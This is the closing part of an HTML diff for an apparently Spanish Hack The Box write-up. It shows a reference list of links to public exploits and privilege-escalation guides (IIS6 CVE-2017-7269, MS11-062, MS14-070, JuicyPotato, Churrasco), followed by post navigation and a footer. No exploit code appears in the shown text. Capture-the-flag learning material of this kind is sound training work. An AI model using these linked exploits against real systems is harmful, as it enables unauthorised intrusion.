+      <li><a href="https://www.exploit-db.com/exploits/41738" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/41738</a></li><li><a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269" target="_blank" rel="noopener noreferrer">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></li><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-062" target="_blank" rel="noopener noreferrer">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-062</a></li><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070" target="_blank" rel="noopener noreferrer">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070</a></li><li><a href="https://github.com/r00t-3xp10it/venom/issues/1" target="_blank" rel="noopener noreferrer">https://github.com/r00t-3xp10it/venom/issues/1</a></li><li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato</a></li><li><a href="https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/" target="_blank" rel="noopener noreferrer">https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/</a></li><li><a href="https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/" target="_blank" rel="noopener noreferrer">https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-artic/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Arctic - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-bank/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Bank - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
